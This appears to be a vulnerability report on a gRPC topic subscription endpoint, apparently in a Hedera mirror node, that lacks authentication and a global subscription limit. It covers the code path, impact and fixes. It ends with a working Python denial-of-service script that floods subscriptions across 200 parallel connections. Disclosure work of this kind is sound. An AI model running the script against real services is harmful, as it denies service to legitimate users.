### Title
Unauthenticated Subscription Flood via Rapid Open/Cancel Cycles Causes Resource Exhaustion DoS

### Summary
The `subscribeTopic()` method in `ConsensusController` accepts connections from any unauthenticated client with no rate limiting or global subscriber cap. An attacker can open an unbounded number of TCP connections, each spawning up to 5 concurrent subscriptions (the only enforced limit, and it is per-connection), then immediately cancel them, forcing repeated allocation and disposal of database queries, Redis listeners, and bounded-elastic scheduler tasks. This degrades or denies service to legitimate subscribers.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` (lines 43–53) immediately starts a full reactive pipeline for every incoming request with zero authentication or rate-limiting gate:

```java
// ConsensusController.java lines 43-53
final var disposable = Mono.fromCallable(() -> toFilter(request))
        .flatMapMany(topicMessageService::subscribeTopic)
        .map(this::toResponse)
        .onErrorMap(ProtoUtil::toStatusRuntimeException)
        .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
    serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
}
```

Each call into `TopicMessageServiceImpl.subscribeTopic()` (lines 59–92) allocates:
- A `TopicContext` object and `Stopwatch`
- A historical DB query via `topicMessageRetriever.retrieve(filter, true)`
- A live Redis/polling listener via `topicListener.listen(newFilter)`
- A `Schedulers.boundedElastic()` task for the 1-second safety-check poll
- An `AtomicLong` increment of the global `subscriberCount` gauge

`subscriberCount` (line 48) is a **metric gauge only** — it is never checked against any maximum; it does not gate new subscriptions.

**The only concurrency control** is `maxConcurrentCallsPerConnection = 5` in `NettyProperties` / `GrpcConfiguration` (line 33 of `GrpcConfiguration.java`):

```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

This limits concurrent calls **per TCP connection**, not across connections. There is no configured limit on the number of TCP connections, no per-IP limit, and no global subscription cap.

**No authentication interceptor exists** in the production gRPC path. The only `ServerInterceptor` found (`grpc/src/test/…/GrpcInterceptor.java`) only sets an `EndpointContext` for table-usage tracking and is in the test package. The `web3` module's `ThrottleConfiguration` / `ThrottleManagerImpl` is entirely separate and does not apply to the `grpc` module.

**Root cause:** The failed assumption is that `maxConcurrentCallsPerConnection` provides sufficient protection. It does not — it is a per-connection ceiling, not a server-wide one.

### Impact Explanation
Each open/cancel cycle forces the server to:
1. Execute a database query (historical message retrieval)
2. Acquire a Redis pub/sub listener or start a polling loop
3. Schedule a bounded-elastic thread for the safety check

Rapid cycling across many connections exhausts the database connection pool, Redis connection pool, and the `boundedElastic` thread scheduler. Legitimate subscribers experience increased latency, missed messages, or outright connection refusal. Because the `subscriberCount` gauge is never enforced as a hard limit, the server has no self-protection mechanism.

**Severity: High** — complete availability impact on the gRPC topic subscription service with no authentication barrier.

### Likelihood Explanation
The attack requires no credentials, no special protocol knowledge beyond standard gRPC, and no privileged network position. Any internet-reachable deployment is exposed. The attacker needs only a gRPC client library and a valid (or even non-existent, if `checkTopicExists=false`) topic ID. The attack is trivially scriptable and repeatable with commodity tooling (e.g., `grpcurl`, any gRPC client). The per-connection limit of 5 is easily bypassed by opening many parallel TCP connections.

### Recommendation
1. **Enforce a global maximum subscriber count**: Check `subscriberCount` against a configurable hard limit before accepting a new subscription; return `RESOURCE_EXHAUSTED` if exceeded.
2. **Add per-IP connection and subscription rate limiting** at the gRPC interceptor layer (e.g., using a token-bucket per remote address).
3. **Add a minimum subscription duration / reconnect backoff**: Track rapid open/cancel cycles per client IP and apply exponential backoff or temporary bans.
4. **Configure Netty `maxConnectionAge` and `maxConnectionIdle`** to bound long-lived idle connections.
5. **Consider adding a global `maxConnections` limit** to the `NettyServerBuilder` configuration in `GrpcConfiguration`.

### Proof of Concept

```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, consensus_topic_query_pb2
from hedera.basic_types_pb2 import TopicID

TARGET = "mirror-node-grpc-host:5600"
TOPIC = TopicID(topicNum=1234)
NUM_CONNECTIONS = 200  # bypass per-connection limit of 5

def flood():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_topic_query_pb2.ConsensusTopicQuery(topicID=TOPIC)
    while True:
        # Open subscription
        call = stub.subscribeTopic(query)
        # Immediately cancel — triggers disposable::dispose on server
        call.cancel()

threads = [threading.Thread(target=flood) for _ in range(NUM_CONNECTIONS)]
for t in threads:
    t.start()
# Each thread opens and cancels subscriptions in a tight loop across a
# separate TCP connection, bypassing maxConcurrentCallsPerConnection=5.
# Server DB pool, Redis connections, and boundedElastic threads are exhausted.
```

**Preconditions:** Network access to the gRPC port; a valid topic ID (or `checkTopicExists=false`).
**Trigger:** Run the script above.
**Result:** Server DB connection pool exhausted; legitimate subscribers receive errors or stall.
